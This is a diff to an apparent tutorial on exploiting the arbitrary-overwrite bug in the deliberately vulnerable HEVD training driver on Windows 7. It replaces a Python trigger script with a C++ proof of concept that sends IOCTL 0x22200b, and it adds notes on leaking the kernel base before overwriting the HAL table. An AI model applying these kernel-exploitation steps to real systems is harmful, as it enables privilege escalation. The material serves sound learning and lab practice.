@@ -115,40 +115,77 @@ Like always, there are multiple ways to capture and discover IOCTLs, feel free t
 Now that we have the needed IOCTL we can send out skeleton script with a payload to the device driver.
 
 ```python
-import sys, os
-import ctypes, struct
-from ctypes import *
- 
-def arbitrary_overwrite():
+#include <windows.h>
+#include <iostream>
 
-    kernel32              = windll.kernel32
-    psapi                 = windll.Psapi
-    ntdll                 = windll.ntdll
+#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL 0x22200b
 
-    lpFileName = "\\\\.\HackSysExtremeVulnerableDriver"
-    device_handle = kernel32.CreateFileA(lpFileName, 0xC0000000, 0, None, 0x3, 0, None)
- 
-    if not device_handle or device_handle == -1:
-        print("[!] Error creating Device handle:" + ctypes.GetLastError())
-        sys.exit()
-    else:
-        print("[+] Device handler setup successful")
-        print("[+] Device handle in use: %s" %lpFileName)
- 
-    buf = "A"*100
-    bufLength = len(buf)
- 
-    kernel32.DeviceIoControl(device_handle, 0x22200b, buf, bufLength, None, 0, byref(c_ulong()), None)
- 
-if __name__ == "__main__":
-    arbitrary_overwrite()
+int main(){
+    std::cout << "[+] HEVD - Arbitrary overwrite Windows 7 x86 exploit POC\n\n";
 
+    HANDLE hDevice = CreateFileA(DEVICE_NAME,
+                                 GENERIC_READ | GENERIC_WRITE,
+                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 NULL,
+                                 OPEN_EXISTING,
+                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+                                 NULL);
+
+    if (hDevice == INVALID_HANDLE_VALUE){
+        std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
+    } else {
+        std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
+    }
+
+    std::cout << "[+] Preparing the buffer payload\n";
+
+    DWORD InBufferSize = 0x64;
+    LPVOID inputBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, InBufferSize);
+
+    if(!inputBuffer){
+        std::cout << "[!] Failed to allocate buffer memory\n";
+    } else {
+        std::cout << "[+] Input buffer memory successfully allocated\n";
+    }
+
+    RtlFillMemory((PVOID)inputBuffer, 0x4, 0x41);
+    RtlFillMemory((PVOID)(inputBuffer + 1), 0x4, 0x42);
+
+    std::cout << "[+] Filled input buffer\n";
+
+    DWORD sizeReturn = 0;
+    BOOL deviceCom = DeviceIoControl(hDevice,
+                    IOCTL,
+                    &inputBuffer,
+                    InBufferSize,
+                    NULL,
+                    0,
+                    &sizeReturn,
+                    NULL);
+
+    HeapFree(GetProcessHeap(), 0, LPVOID(inputBuffer));
+    CloseHandle(hDevice);
+
+
+    return 0;
+}
 ```
 
-### Get the Base Name and address from ntkrnlpa.exe
+This code should trigger the vulnerability if you decide to set a breakpoint on `TriggerArbitraryOverwrite`. 
 
-To get the base address of ntkrnlpa.exe we can use the EnumDeviceDrivers function
+### Infoleak to get the base address
 
+We can use the `NtQuerySystemInformation` function for a easy information leak, this will allow us to obtain the kernel base address from ntoskrnl, which will allow us to locate the HAL. Before we overwrite the HAL entry, we need to find where it is.
+
+```c++
+__kernel_entry NTSTATUS NtQuerySystemInformation(
+  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+  OUT PVOID                   SystemInformation,
+  IN ULONG                    SystemInformationLength,
+  OUT PULONG                  ReturnLength
+);
+```
 
 ### Overwriting 0x4
 
